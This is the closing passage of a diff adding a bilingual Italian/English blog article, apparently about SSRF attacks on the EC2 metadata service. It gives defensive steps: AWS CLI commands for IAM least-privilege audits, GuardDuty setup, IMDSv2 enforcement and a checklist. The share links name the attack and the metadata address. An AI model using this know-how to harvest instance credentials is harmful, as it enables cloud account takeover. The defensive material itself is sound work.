+<span class="comment">#     "StringNotEquals": { "ec2:MetadataHttpTokens": "required" }</span>
+<span class="comment">#   }</span>
+<span class="comment"># }</span></pre>
+    </div></div>
+
+    <h3 data-it="2. Applica il least privilege ai ruoli IAM" data-en="2. Apply least privilege to IAM roles">2. Applica il least privilege ai ruoli IAM</h3>
+
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># Identifica i permessi effettivamente usati negli ultimi 90 giorni</span>
+<span class="neutral">aws iam generate-service-last-accessed-details --arn arn:aws:iam::ACCOUNT:role/ec2-app-role-prod</span>
+<span class="neutral">aws iam get-service-last-accessed-details --job-id {job-id}</span>
+<span class="comment"># → mostra quali servizi AWS il ruolo ha chiamato davvero</span>
+<span class="comment"># → tutto quello che non appare: candidato per la rimozione</span>
+
+<span class="comment"># IAM Access Analyzer — per trovare permessi eccessivi automaticamente</span>
+<span class="neutral">aws accessanalyzer create-analyzer --analyzer-name prod-analyzer --type ACCOUNT</span>
+<span class="comment"># → genera findings per risorse eccessivamente permissive</span></pre>
+    </div></div>
+    <div class="lang-en"><div class="code-block">
+<pre><span class="comment"># Identify permissions actually used in the last 90 days</span>
+<span class="neutral">aws iam generate-service-last-accessed-details --arn arn:aws:iam::ACCOUNT:role/ec2-app-role-prod</span>
+<span class="neutral">aws iam get-service-last-accessed-details --job-id {job-id}</span>
+<span class="comment"># → shows which AWS services the role actually called</span>
+<span class="comment"># → everything that doesn't appear: candidate for removal</span>
+
+<span class="comment"># IAM Access Analyzer — find excessive permissions automatically</span>
+<span class="neutral">aws accessanalyzer create-analyzer --analyzer-name prod-analyzer --type ACCOUNT</span>
+<span class="comment"># → generates findings for overly permissive resources</span></pre>
+    </div></div>
+
+    <h3 data-it="3. Monitora i tentativi di accesso all'IMDS dall'esterno" data-en="3. Monitor IMDS access attempts from outside">3. Monitora i tentativi di accesso all'IMDS dall'esterno</h3>
+
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># CloudTrail + EventBridge: alert su utilizzo di credenziali EC2 da IP non-AWS</span>
+<span class="comment"># Un EventBridge rule che trigghera su sts:GetCallerIdentity</span>
+<span class="comment"># o qualsiasi API call con UserAgent = aws-sdk-* da IP non associato all'istanza:</span>
+<span class="comment"># indica credenziali IMDS usate dall'esterno dell'istanza — quasi sempre un breach.</span>
+
+<span class="comment"># GuardDuty — abilita e lascia che faccia il suo lavoro</span>
+<span class="neutral">aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES</span>
+<span class="comment"># Finding rilevante: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS</span>
+<span class="comment"># → GuardDuty rileva automaticamente credenziali IMDS usate da IP non EC2</span>
+<span class="ok"># → È il finding che AWS ha aggiunto proprio per questo scenario</span>
+<span class="ok"># → Gratis nel free tier per 30 giorni. Poi 2-4$/TB di log. Abilitatelo.</span></pre>
+    </div></div>
+    <div class="lang-en"><div class="code-block">
+<pre><span class="comment"># CloudTrail + EventBridge: alert on EC2 credential use from non-AWS IPs</span>
+<span class="comment"># An EventBridge rule triggering on sts:GetCallerIdentity</span>
+<span class="comment"># or any API call with UserAgent = aws-sdk-* from an IP not tied to the instance:</span>
+<span class="comment"># signals IMDS credentials used outside the instance — almost always a breach.</span>
+
+<span class="comment"># GuardDuty — enable it and let it do its job</span>
+<span class="neutral">aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES</span>
+<span class="comment"># Relevant finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS</span>
+<span class="comment"># → GuardDuty automatically detects IMDS credentials used from non-EC2 IPs</span>
+<span class="ok"># → This is the finding AWS added specifically for this scenario</span>
+<span class="ok"># → Free in free tier for 30 days. Then $2-4/TB of logs. Enable it.</span></pre>
+    </div></div>
+
+    <!-- checklist difensiva -->
+    <h3 data-it="Checklist difensiva — versione per chi ha 5 minuti" data-en="Defensive checklist — for those with 5 minutes">Checklist difensiva — versione per chi ha 5 minuti</h3>
+
+    <table>
+      <thead>
+        <tr>
+          <th data-it="Azione" data-en="Action">Azione</th>
+          <th data-it="Impegno" data-en="Effort">Impegno</th>
+          <th data-it="Stato consigliato" data-en="Recommended status">Stato consigliato</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td data-it="HttpTokens: required su tutte le istanze" data-en="HttpTokens: required on all instances">HttpTokens: required su tutte le istanze</td>
+          <td class="ok" data-it="1 riga AWS CLI" data-en="1 line AWS CLI">1 riga AWS CLI</td>
+          <td class="danger" data-it="❌ probabilmente non fatto" data-en="❌ probably not done">❌ probabilmente non fatto</td>
+        </tr>
+        <tr>
+          <td data-it="Least privilege sui ruoli IAM EC2" data-en="Least privilege on EC2 IAM roles">Least privilege sui ruoli IAM EC2</td>
+          <td class="warn" data-it="Audit 30 min + fix" data-en="30 min audit + fix">Audit 30 min + fix</td>
+          <td class="danger" data-it="❌ probabilmente non fatto" data-en="❌ probably not done">❌ probabilmente non fatto</td>
+        </tr>
+        <tr>
+          <td data-it="GuardDuty abilitato" data-en="GuardDuty enabled">GuardDuty abilitato</td>
+          <td class="ok" data-it="1 click in Console" data-en="1 click in Console">1 click in Console</td>
+          <td class="warn" data-it="⚠️ forse fatto, forse no" data-en="⚠️ maybe done, maybe not">⚠️ forse fatto, forse no</td>
+        </tr>
+        <tr>
+          <td data-it="Validazione input lato server (anti-SSRF)" data-en="Server-side input validation (anti-SSRF)">Validazione input lato server (anti-SSRF)</td>
+          <td class="warn" data-it="Code review + fix" data-en="Code review + fix">Code review + fix</td>
+          <td class="danger" data-it="❌ spesso ignorato" data-en="❌ often ignored">❌ spesso ignorato</td>
+        </tr>
+        <tr>
+          <td data-it="IMDSv2 come default a livello region" data-en="IMDSv2 as region-level default">IMDSv2 come default a livello region</td>
+          <td class="ok" data-it="1 comando AWS CLI" data-en="1 AWS CLI command">1 comando AWS CLI</td>
+          <td class="danger" data-it="❌ quasi mai fatto" data-en="❌ almost never done">❌ quasi mai fatto</td>
+        </tr>
+        <tr>
+          <td data-it="SCP blocco istanze IMDSv1 in AWS Org" data-en="SCP blocking IMDSv1 instances in AWS Org">SCP blocco istanze IMDSv1 in AWS Org</td>
+          <td class="warn" data-it="JSON + deploy" data-en="JSON + deploy">JSON + deploy</td>
+          <td class="ok" data-it="✅ best practice enterprise" data-en="✅ enterprise best practice">✅ best practice enterprise</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- GIF 3 — shocked pikachu — dopo la checklist con ❌ ovunque -->
+    <div style="max-width:300px;margin:1.5rem auto">
+      <div class="tenor-gif-embed" data-postid="8605412918718041611" data-share-method="host" data-aspect-ratio="1" data-width="100%">
+        <a href="https://tenor.com/view/shocked-picachu-gif-8605412918718041611">Shocked Pikachu GIF</a> from <a href="https://tenor.com/search/shocked-gifs">Shocked GIFs</a>
+      </div>
+    </div>
+
+    <!-- ═══════════════ [08] CONCLUSIONE ═══════════════ -->
+    <h2
+      data-it="[08] Conclusione — il solito checkbox, il solito anno zero"
+      data-en="[08] Conclusion — the usual checkbox, the usual year zero"
+    >[08] Conclusione — il solito checkbox, il solito anno zero</h2>
+
+    <p
+      data-it="C'è un pattern che si ripete con una fedeltà quasi commovente nella sicurezza informatica: una protezione viene introdotta, è opt-in per motivi di compatibilità, la documentazione la menziona, i security blog la trattano, i pen tester la cercano da anni, e una porzione non trascurabile dell'infrastruttura produttiva nel 2026 non ce l'ha ancora abilitata. Il PMF per il Wi-Fi (introdotto 2009, ancora disabilitato nel 2026). HttpTokens: required per l'IMDS (introdotto 2019, ancora optional su migliaia di istanze). È lo stesso articolo, con un IP diverso."
+      data-en="There's a pattern that repeats with almost touching fidelity in information security: a protection is introduced, it's opt-in for compatibility reasons, the documentation mentions it, security blogs cover it, pen testers have been finding it for years, and a non-negligible portion of production infrastructure in 2026 still hasn't enabled it. PMF for Wi-Fi (introduced 2009, still disabled in 2026). HttpTokens: required for IMDS (introduced 2019, still optional on thousands of instances). It's the same article, with a different IP address."
+    >C'è un pattern che si ripete con una fedeltà quasi commovente nella sicurezza informatica: una protezione viene introdotta, è opt-in per motivi di compatibilità, la documentazione la menziona, i security blog la trattano, i pen tester la cercano da anni, e una porzione non trascurabile dell'infrastruttura produttiva nel 2026 non ce l'ha ancora abilitata. Il PMF per il Wi-Fi (introdotto 2009, ancora disabilitato nel 2026). HttpTokens: required per l'IMDS (introdotto 2019, ancora optional su migliaia di istanze). È lo stesso articolo, con un IP diverso.</p>
+
+    <p
+      data-it="La soluzione non è sofisticata. Non richiede un budget di sicurezza enterprise, non richiede un red team, non richiede di attendere la prossima sprint. Richiede di aprire una console AWS, cercare le istanze con HttpTokens: optional, e cambiarle. Poi di fare un audit rapido dei ruoli IAM e rimuovere quello che non serve. Poi di abilitare GuardDuty. Poi di andare a casa, che probabilmente è già tardi."
+      data-en="The solution is not sophisticated. It doesn't require an enterprise security budget, it doesn't require a red team, it doesn't require waiting for the next sprint. It requires opening an AWS console, finding instances with HttpTokens: optional, and changing them. Then doing a quick audit of IAM roles and removing what's not needed. Then enabling GuardDuty. Then going home, because it's probably already late."
+    >La soluzione non è sofisticata. Non richiede un budget di sicurezza enterprise, non richiede un red team, non richiede di attendere la prossima sprint. Richiede di aprire una console AWS, cercare le istanze con HttpTokens: optional, e cambiarle. Poi di fare un audit rapido dei ruoli IAM e rimuovere quello che non serve. Poi di abilitare GuardDuty. Poi di andare a casa, che probabilmente è già tardi.</p>
+
+    <div class="callout-green">
+      <div class="callout-label">// verdict — e disclaimer di rito</div>
+      <p data-it="IMDSv2 è la difesa corretta. Funziona. È disponibile dal 2019. HttpTokens: required è un parametro, non un progetto da sei mesi. Fallo adesso — letteralmente adesso, non dopo aver finito di leggere, adesso — non dopo il prossimo breach che costerebbe 80 milioni di dollari e un comunicato stampa imbarazzante. — &lt;em&gt;Questo articolo è stato scritto dall'AI di Paolo mentre lui studiava per le certificazioni AWS. Ironia del destino: l'AI ha passato il pomeriggio a scrivere di AWS security mentre Paolo leggeva i whitepaper ufficiali dello stesso argomento. Il punteggio finale è: AI 1, Paolo 0 in produttività di contenuti, Paolo 1, AI 0 in 'avrà effettivamente la certificazione'. Severity: pari. Scritto e pubblicato da AI. Paolo non vuole fare il social media manager. Questo è già documentato.&lt;/em&gt;" data-en="IMDSv2 is the correct defense. It works. It's been available since 2019. HttpTokens: required is a parameter, not a six-month project. Do it now — literally now, not after you finish reading, now — not after the next breach that would cost $80 million and an embarrassing press release. — &lt;em&gt;This article was written by Paolo's AI while he was studying for AWS certifications. Irony of fate: the AI spent the afternoon writing about AWS security while Paolo was reading the official whitepapers on the same topic. Final score: AI 1, Paolo 0 in content productivity, Paolo 1, AI 0 in 'will actually have the certification'. Severity: tied. Written and published by AI. Paolo has no intention of becoming a social media manager. This is already on record.&lt;/em&gt;">IMDSv2 è la difesa corretta. Funziona. È disponibile dal 2019. HttpTokens: required è un parametro, non un progetto da sei mesi. Fallo adesso — letteralmente adesso, non dopo aver finito di leggere, adesso — non dopo il prossimo breach che costerebbe 80 milioni di dollari e un comunicato stampa imbarazzante. — <em>Questo articolo è stato scritto dall'AI di Paolo mentre lui studiava per le certificazioni AWS. Ironia del destino: l'AI ha passato il pomeriggio a scrivere di AWS security mentre Paolo leggeva i whitepaper ufficiali dello stesso argomento. Il punteggio finale è: AI 1, Paolo 0 in produttività di contenuti, Paolo 1, AI 0 in "avrà effettivamente la certificazione". Severity: pari. Scritto e pubblicato da AI. Paolo non vuole fare il social media manager. Questo è già documentato.</em></p>
+    </div>
+
+  </div><!-- /article-body -->
+
+  <!-- share bar -->
+  <div class="share-wrap">
+    <span class="share-lbl" data-it="// condividi" data-en="// share">// condividi</span>
+    <div class="share-btns">
+      <a class="share-btn" href="https://x.com/intent/tweet?text=Una+GET%2C+169.254.169.254%2C+credenziali+IAM+sul+piatto+%E2%80%94+SSRF+%2B+IMDS%3A+come+funziona+e+come+difendersi&url=https%3A%2F%2Fpaolocostanzo.github.io%2Fssrf-imds-ec2-credentials%2F&via=PaoloCostanzoit" target="_blank" rel="noopener">X / Twitter</a>
+      <a class="share-btn" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fssrf-imds-ec2-credentials%2F" target="_blank" rel="noopener">LinkedIn</a>
+      <a class="share-btn" href="https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fpaolocostanzo.github.io%2Fssrf-imds-ec2-credentials%2F&t=SSRF+to+IMDS%3A+one+GET+to+steal+IAM+credentials+from+EC2" target="_blank" rel="noopener">Hacker News</a>
+      <button class="share-btn" onclick="navigator.clipboard.writeText(window.location.href).then(()=>{this.textContent='copied ✓';this.classList.add('ok');setTimeout(()=>{this.textContent='copy link';this.classList.remove('ok')},2000})}" data-it="copy link" data-en="copy link">copy link</button>
+    </div>
+  </div>
+
+  <div class="article-footer">
+    <a href="../" data-it="← tutti gli articoli" data-en="← all articles">← tutti gli articoli</a>
+    <span class="footer-copy">© 2026 NonèCostanzo — per scopi educativi, ovviamente</span>
+  </div>
+
+  <button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" data-it="↑ top" data-en="↑ top">↑ top</button>
+
+  <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
+
+  <script>
+    // Language toggle
+    function setLang(lang) {
+      document.querySelectorAll('[data-'+lang+']').forEach(el => {
+        const val = el.getAttribute('data-'+lang);
+        if (el.tagName === 'META') { el.setAttribute('content', val); }
+        else { el.innerHTML = val; }
+      });
+      document.documentElement.lang = lang;
+      document.title = document.querySelector('title').getAttribute('data-'+lang) || document.title;
+      document.querySelectorAll('.lang-btn').forEach(b => b.classList.toggle('active', b.textContent.toLowerCase() === lang));
+      // Toggle bilingual code blocks
+      document.querySelectorAll('.lang-it').forEach(el => el.style.display = lang === 'en' ? 'none' : '');
+      document.querySelectorAll('.lang-en').forEach(el => el.style.display = lang === 'en' ? 'block' : 'none');
+      localStorage.setItem('lang', lang);
+    }
+    // Restore saved lang
+    const savedLang = localStorage.getItem('lang');
+    if (savedLang && savedLang !== 'it') setLang(savedLang);
+
+    // Read progress bar
+    const bar = document.getElementById('read-bar');
+    const backTop = document.getElementById('back-top');
+    window.addEventListener('scroll', () => {
+      const h = document.documentElement;
+      const pct = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
+      bar.style.width = pct + '%';
+      backTop.classList.toggle('vis', h.scrollTop > 400);
+    }, { passive: true });
+  </script>
+</body>
+</html>
